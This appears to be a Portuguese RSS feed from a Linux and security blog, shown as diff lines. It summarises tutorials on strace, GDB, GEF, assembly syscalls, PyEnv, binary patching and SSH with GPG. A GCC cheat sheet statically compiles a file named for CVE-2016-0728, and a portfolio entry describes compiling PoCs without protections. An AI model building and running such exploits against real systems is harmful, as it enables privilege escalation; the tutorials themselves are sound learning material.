+&lt;li>&lt;strong>Desafios de CTF&lt;/strong> e pesquisa de vulnerabilidades&lt;/li>
+&lt;li>&lt;strong>Modificar comportamento&lt;/strong> de aplicações closed-source&lt;/li>
+&lt;li>&lt;strong>Criar diffs binários&lt;/strong> para distribuir patches&lt;/li>
+&lt;/ul>
+&lt;p>Em vez de editar código-fonte de alto nível e recompilar, você modifica diretamente os bytes de código de máquina no arquivo executável. Isso requer compreensão de representação hexadecimal e formatos de arquivo executável.&lt;/p></description></item><item><title>Artigo :: Debugando com strace</title><link>https://psylinux.github.io/pt/articles/article_debugging_with_strace/</link><pubDate>Sun, 13 Jan 2019 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/articles/article_debugging_with_strace/</guid><description>&lt;h2 id="introdução">Introdução&lt;/h2>
+&lt;p>Ao final deste artigo, você entenderá como usar o strace para depurar programas sem acesso ao código-fonte, rastrear chamadas de sistema e solucionar problemas de execução no Linux.&lt;/p>
+&lt;h2 id="visão-geral">Visão Geral&lt;/h2>
+&lt;p>Depurar sem código-fonte pode parecer resolver um quebra-cabeça no escuro. O strace ilumina o caminho mostrando exatamente quais chamadas de sistema um programa faz, desde abertura de arquivos até conexões de rede. Se você está solucionando um crash, investigando comportamento suspeito, ou apenas curioso sobre como um programa funciona por baixo dos panos, o strace é uma ferramenta essencial no seu kit Linux.&lt;/p></description></item><item><title>HowTo :: Instalar PyEnv (Gerenciamento Simples de Versões Python)</title><link>https://psylinux.github.io/pt/howto/howto_install_pyenv/</link><pubDate>Fri, 04 Jan 2019 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/howto/howto_install_pyenv/</guid><description>&lt;h2 id="introdução">Introdução&lt;/h2>
+&lt;p>Gerenciar múltiplas versões do Python em uma única máquina pode ser um pesadelo. Ferramentas do sistema frequentemente dependem de uma versão específica do Python, e atualizá-la pode quebrar seu sistema operacional. &lt;strong>PyEnv&lt;/strong> resolve isso permitindo que você instale e alterne facilmente entre múltiplas versões isoladas do Python.&lt;/p>
+&lt;p>Neste guia, você aprenderá como:&lt;/p>
+&lt;ol>
+&lt;li>Instalar o PyEnv e suas dependências de build&lt;/li>
+&lt;li>Configurar seu shell para usar o PyEnv&lt;/li>
+&lt;li>Instalar diferentes versões do Python&lt;/li>
+&lt;li>Gerenciar ambientes virtuais facilmente&lt;/li>
+&lt;/ol>
+&lt;h2 id="1-estabelecendo-o-ambiente-de-build">1. Estabelecendo o Ambiente de Build&lt;/h2>
+&lt;p>O PyEnv compila o Python a partir do código-fonte. Para fazer isso, você precisa de um conjunto de dependências de build instaladas no seu sistema.&lt;/p></description></item><item><title>Artigo :: Usando syscalls do Linux em Assembly</title><link>https://psylinux.github.io/pt/articles/article_linux_syscalls_in_assembly/</link><pubDate>Fri, 28 Dec 2018 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/articles/article_linux_syscalls_in_assembly/</guid><description>&lt;h2 id="introdução">Introdução&lt;/h2>
+&lt;p>Este tutorial prático ensina como escrever programas assembly que invocam chamadas de sistema do Linux diretamente, ignorando a biblioteca C e interagindo com o kernel no nível mais baixo.&lt;/p>
+&lt;h2 id="visão-geral">Visão Geral&lt;/h2>
+&lt;p>Quando um programa precisa interagir com o sistema operacional; para escrever em um arquivo, alocar memória ou finalizar graciosamente; ele faz uma &lt;strong>chamada de sistema&lt;/strong> (syscall). A maioria dos programadores usa essas chamadas indiretamente através de wrappers da biblioteca C, mas entender como invocar syscalls diretamente do assembly te dá uma visão profunda de como programas realmente funcionam.&lt;/p></description></item><item><title>Artigo :: Começando com GDB</title><link>https://psylinux.github.io/pt/articles/article_getting_start_with_gdb/</link><pubDate>Sun, 16 Dec 2018 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/articles/article_getting_start_with_gdb/</guid><description>&lt;h2 id="introdução">Introdução&lt;/h2>
+&lt;p>Este guia completo cobre tudo o que você precisa para começar a depurar programas C com GDB, desde compilar com símbolos de depuração até inspecionar memória e controlar a execução do programa.&lt;/p>
+&lt;h2 id="visão-geral">Visão Geral&lt;/h2>
+&lt;p>GDB (GNU Debugger) é o depurador padrão para programas compilados com GCC. Ao contrário de ferramentas como strace que mostram chamadas de sistema, o GDB permite percorrer seu código-fonte linha por linha, inspecionar variáveis, definir breakpoints condicionais e até modificar o comportamento do programa durante a execução.&lt;/p></description></item><item><title>Cheat Sheet :: GCC Compiling Cheat Sheet</title><link>https://psylinux.github.io/pt/cheatsheet/cheatsheet_gcc_compiling/</link><pubDate>Sun, 16 Dec 2018 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/cheatsheet/cheatsheet_gcc_compiling/</guid><description>&lt;h2 id="1-compilação-estática">1. Compilação estática&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc -static cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="2-compilação-cruzada-de-c-do-linux-para-windows">2. Compilação cruzada de C do Linux para Windows&lt;/h2>
+&lt;h3 id="21-instalar-o-cross-compiler-mingw-w64">2.1. Instalar o cross-compiler mingw-w64:&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>apt-get install mingw-w64
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="22-para-compilar-um-executável-windows-pe-32-bit">2.2. Para compilar um executável Windows PE 32-bit:&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>i686-w64-mingw32-gcc 271.c -o &lt;span style="color:#ae81ff">271&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x86_64-w64-mingw32-gcc-win32 271.c -o &lt;span style="color:#ae81ff">271&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="23-rodar-o-binário-com-wine">2.3. Rodar o binário com &lt;strong>wine&lt;/strong>:&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>wine file.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="3-compilando-com-símbolos-de-debug">3. Compilando com símbolos de debug&lt;/h2>
+&lt;p>Tipos de arquivo de símbolo de debug:&lt;/p></description></item><item><title>HowTo :: Instalar GEF (plug-in do GDB)</title><link>https://psylinux.github.io/pt/howto/howto_install_gdb_gef/</link><pubDate>Sun, 16 Dec 2018 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/howto/howto_install_gdb_gef/</guid><description>&lt;h2 id="introdução">Introdução&lt;/h2>
+&lt;p>Instale o GEF para turbinar sua experiência de depuração com GDB, adicionando syntax highlighting, exibição automática de contexto e dezenas de comandos poderosos.&lt;/p>
+&lt;h2 id="o-que-é-gef">O que é GEF?&lt;/h2>
+&lt;p>GEF (GDB Enhanced Features) é um plugin poderoso que transforma o GDB de um depurador básico de linha de comando em uma ferramenta moderna e amigável de depuração. Ele adiciona:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Exibição automática de contexto&lt;/strong> mostrando registradores, pilha, código e threads após cada passo&lt;/li>
+&lt;li>&lt;strong>Syntax highlighting&lt;/strong> para assembly e código-fonte&lt;/li>
+&lt;li>&lt;strong>Ferramentas de inspeção de memória&lt;/strong> com formatação visual&lt;/li>
+&lt;li>&lt;strong>Breakpoints aprimorados&lt;/strong> com melhor visualização&lt;/li>
+&lt;li>&lt;strong>Auxiliares para desenvolvimento de exploits&lt;/strong> para pesquisa de segurança&lt;/li>
+&lt;li>&lt;strong>Extensibilidade baseada em Python&lt;/strong> para adicionar seus próprios comandos&lt;/li>
+&lt;/ul>
+&lt;p>Se você já usou o GDB e achou difícil acompanhar o que está acontecendo, o GEF resolve esse problema mostrando tudo que você precisa em uma interface organizada e colorida.&lt;/p></description></item><item><title>Auto SSH</title><link>https://psylinux.github.io/pt/portfolio/auto-ssh/</link><pubDate>Sun, 16 Dec 2018 00:00:00 +0000</pubDate><guid>https://psylinux.github.io/pt/portfolio/auto-ssh/</guid><description>&lt;p>&lt;a href="https://github.com/psylinux/auto-ssh">&lt;em>auto-ssh.sh&lt;/em>&lt;/a> :: Este script monta um sistema de arquivos automaticamente via ssh e abre uma sessão ssh com X11 Forward ativado. Você precisa definir as variáveis de ambiente antes de usar o script.&lt;/p></description></item><item><title>Minhas apresentações</title><link>https://psylinux.github.io/pt/portfolio/my-presentations/</link><pubDate>Sun, 16 Dec 2018 00:00:00 +0000</pubDate><guid>https://psylinux.github.io/pt/portfolio/my-presentations/</guid><description>&lt;p>&lt;a href="https://github.com/psylinux/Presentations">&lt;em>Minhas apresentações&lt;/em>&lt;/a> :: Algumas das minhas apresentações e artigos publicados em diferentes conferências.&lt;/p></description></item><item><title>POC Compiler</title><link>https://psylinux.github.io/pt/portfolio/poc-compiler/</link><pubDate>Sun, 16 Dec 2018 00:00:00 +0000</pubDate><guid>https://psylinux.github.io/pt/portfolio/poc-compiler/</guid><description>&lt;p>&lt;a href="https://github.com/psylinux/poc-compiler">&lt;em>POC-Compiler.sh&lt;/em>&lt;/a> :: Script simples em Bash para compilar arquivos de PoC em C ou Assembly (nasm) sem proteções.&lt;/p></description></item><item><title>Relatório de Velocidade da Internet</title><link>https://psylinux.github.io/pt/portfolio/speed-report/</link><pubDate>Sun, 16 Dec 2018 00:00:00 +0000</pubDate><guid>https://psylinux.github.io/pt/portfolio/speed-report/</guid><description>&lt;p>&lt;a href="https://github.com/psylinux/internet_report">&lt;em>Internet Speed Report&lt;/em>&lt;/a> :: Internet Speed Report é um script simples de linha de comando que automatiza testes de velocidade da internet gerando um relatório gráfico em .png no diretório reports.&lt;/p></description></item><item><title>Templates de VM para Packer</title><link>https://psylinux.github.io/pt/portfolio/packer-vm-templates/</link><pubDate>Sun, 16 Dec 2018 00:00:00 +0000</pubDate><guid>https://psylinux.github.io/pt/portfolio/packer-vm-templates/</guid><description>&lt;p>&lt;a href="https://github.com/psylinux/packer-vm-templates">&lt;em>Packer VM Templates&lt;/em>&lt;/a> :: é uma coleção de templates do Packer.io usados para automatizar a criação de imagens de Máquinas Virtuais.&lt;/p>
+&lt;p>Conteúdo:&lt;/p>
+&lt;ul>
+&lt;li>Modelo Kali Linux: Uma configuração específica (packer-kali-template) para compilar imagens do Kali Linux.&lt;/li>
+&lt;li>Modelos Genéricos/Base: Outros modelos gerais (packer-template).
+É open-source (Licença BSD 3-Clause) e permite builds reprodutíveis desses ambientes de VM como código.&lt;/li>
+&lt;/ul></description></item><item><title>HowTo :: Acesso SSH usando chave GPG para autenticação</title><link>https://psylinux.github.io/pt/howto/howto_ssh_with_gpg/</link><pubDate>Tue, 02 Oct 2018 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/howto/howto_ssh_with_gpg/</guid><description>&lt;h2 id="prefácio">Prefácio&lt;/h2>
+&lt;p>Muitos de nós já conhecemos o Secure Shell (SSH), que permite conectar a outros sistemas usando uma chave em vez de senha. Este guia explica como eliminar chaves SSH e usar uma subchave do GNU Privacy Guard (GPG) no lugar. Usar GPG não torna suas conexões SSH mais seguras. SSH é um protocolo seguro, e chaves SSH são seguras. Em vez disso, isso torna mais fácil certos aspectos de distribuição de chaves e gestão de backups. Também não muda seu workflow de uso do SSH. Todos os comandos continuarão funcionando como você espera, exceto que você não terá mais chaves privadas SSH, você vai desbloquear sua chave GPG.&lt;/p></description></item></channel></rss>
